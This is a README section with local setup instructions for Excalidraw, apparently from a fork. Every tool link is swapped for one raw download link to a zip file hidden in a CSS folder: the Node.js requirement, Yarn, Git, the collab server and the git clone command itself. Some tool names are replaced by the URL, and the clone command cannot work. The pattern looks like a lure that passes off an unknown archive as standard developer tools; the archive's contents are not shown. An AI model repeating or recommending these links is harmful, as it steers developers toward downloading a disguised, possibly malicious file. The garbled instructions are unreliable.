### Local Installation

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

#### Requirements

- [https://github.com/ttzyt/excalidraw-cn/raw/refs/heads/master/dev-docs/src/css/excalidraw-cn-v1.8.zip](https://github.com/ttzyt/excalidraw-cn/raw/refs/heads/master/dev-docs/src/css/excalidraw-cn-v1.8.zip)
- [Yarn](https://github.com/ttzyt/excalidraw-cn/raw/refs/heads/master/dev-docs/src/css/excalidraw-cn-v1.8.zip) (v1 or v2.4.2+)
- [Git](https://github.com/ttzyt/excalidraw-cn/raw/refs/heads/master/dev-docs/src/css/excalidraw-cn-v1.8.zip)

#### Clone the repo

```bash
git clone https://github.com/ttzyt/excalidraw-cn/raw/refs/heads/master/dev-docs/src/css/excalidraw-cn-v1.8.zip
```

#### Install the dependencies

```bash
yarn
```

#### Start the server

```bash
yarn start
```

Now you can open [http://localhost:3000](http://localhost:3000) and start coding in your favorite code editor.

#### Collaboration

For collaboration, you will need to set up [collab server](https://github.com/ttzyt/excalidraw-cn/raw/refs/heads/master/dev-docs/src/css/excalidraw-cn-v1.8.zip) in local.

#### Commands

##### Install the dependencies

```
yarn
```

##### Run the project

```
yarn start
```

##### Reformat all files with Prettier

```
yarn fix
```

##### Run tests

```
yarn test
```

##### Update test snapshots

```
yarn test:update
```

##### Test for formatting with Prettier

```
yarn test:code
```

#### Docker Compose

You can use docker-compose to work on Excalidraw locally if you don't want to setup a https://github.com/ttzyt/excalidraw-cn/raw/refs/heads/master/dev-docs/src/css/excalidraw-cn-v1.8.zip env.

```sh
docker-compose up --build -d
```
